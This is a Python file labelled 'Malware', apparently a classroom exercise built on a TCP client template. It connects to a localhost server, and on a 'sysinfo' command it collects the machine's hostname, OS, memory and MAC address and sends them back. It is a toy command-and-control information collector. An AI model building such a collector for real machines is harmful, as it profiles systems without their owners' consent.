"""Malware
The origin of this code is from:
https://github.com/amir78729/python-TCP-client-server-template/blob/main/Client.py
"""

import socket
from time import ctime
import select
import sys
import platform
import subprocess
import psutil
import re
import uuid
import os
import time
import locale


class Malware:
    def __init__(self):
        self.HOST = 'localhost'
        self.PORT = 12346
        self.MESSAGE_LENGTH_SIZE = 64
        self.ENCODING = 'utf-8'
        self.ADDRESS_INFORMATION = (self.HOST, self.PORT)
        self.system_info = {}

    def send_message(self, client, msg):
        message = msg.encode(self.ENCODING)
        msg_length = len(message)
        msg_length = str(msg_length).encode(self.ENCODING)
        msg_length += b' ' * (self.MESSAGE_LENGTH_SIZE - len(msg_length))
        client.send(msg_length)
        client.send(message)

    def get_system_info(self):
        self.system_info['Host Name'] = socket.gethostname()
        self.system_info['OS Name'] = platform.system()
        self.system_info['OS Version'] = platform.release()
        self.system_info['OS Manufacturer'] = '?'
        self.system_info['OS Configuration'] = platform.machine()
        self.system_info['Registered Owner'] = '?'
        self.system_info['Registered Organization'] = '?'
        self.system_info['Product ID'] = '?'
        self.system_info['Original Install Date'] = '?'
        self.system_info['System Boot Time'] = str(psutil.boot_time()) + 's'
        self.system_info['System Manufacturer'] = '?'
        self.system_info['System Model'] = '?'
        self.system_info['System Type'] = '?'
        self.system_info['Processor(s)'] = platform.processor()
        self.system_info['BIOS Version'] = '?'
        self.system_info['Windows Directory'] = '?'
        self.system_info['System Directory'] = '?'
        self.system_info['Boot Device'] = '?'
        self.system_info['System Locale'] = '{}({})'.format(locale.getdefaultlocale()[0], locale.getdefaultlocale()[1])
        self.system_info['Input Locale'] = '?'
        self.system_info['Time Zone'] = time.tzname[0]
        self.system_info['Total Physical Memory'] = '?'
        self.system_info['Available Physical Memory'] = '?'
        self.system_info['Virtual Memory: Max Size'] = str(
            round(psutil.virtual_memory().total / (1024.0 ** 3), 4)) + " GB"
        self.system_info['Virtual Memory: Available'] = str(
            round(psutil.virtual_memory().available / (1024.0 ** 3), 4)) + " GB"
        self.system_info['Virtual Memory: In Use'] = str(
            round(psutil.virtual_memory().total / (1024.0 ** 3), 4) -
            round(psutil.virtual_memory().available / (1024.0 ** 3), 4)
        ) + " GB"
        self.system_info['Page File Location(s)'] = '?'
        self.system_info['Domain'] = '?'
        self.system_info['Logon Server'] = '?'
        self.system_info['Hotfix(s)'] = '?'
        self.system_info['OS Architecture'] = platform.machine()
        self.system_info['Mac Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.system_info['RAM'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"

    def stringify_system_info(self):
        res = '\n-------\n'
        for info in self.system_info.keys():
            res += '{}: {}\n'.format(info, self.system_info[info])
        return res

    def main(self):
        print('{}\t[RUNNING MALWARE]'.format(ctime()))
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(self.ADDRESS_INFORMATION)
        gets = [client, sys.stdin]
        while True:
            try:
                ready_input, ready_output, ready_exception = select.select(gets, [], [])
                for in_message in ready_input:
                    if in_message == client:
                        message_length = int(client.recv(self.MESSAGE_LENGTH_SIZE).decode(self.ENCODING))
                        message = client.recv(message_length).decode(self.ENCODING)
                        if not message:
                            break
                        if message.lower() == 'sysinfo':
                            print('{}\t[SENDING DATA TO SERVER]'.format(ctime()))
                            if platform.system().lower() != 'windows':
                                self.get_system_info()
                                self.send_message(client, self.stringify_system_info())
                            else:
                                pass
                        elif message.lower() == '-q':
                            print('{}\t[TERMINATING MALWARE]'.format(ctime()))
                            sys.exit()
                    else:
                        message = input()
                        if not message:
                            break
                        self.send_message(client, message)
            except ValueError:
                print('{}\t[CONNECTION LOST]'.format(ctime()))
                break


if __name__ == '__main__':
    # Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    # new = []
    #
    # # arrange the string into clear info
    # for item in Id:
    #     new.append(str(item.split("\r")[:-1]))
    # for i in new:
    #     print(i[2:-2])

    malware = Malware()
    malware.main()
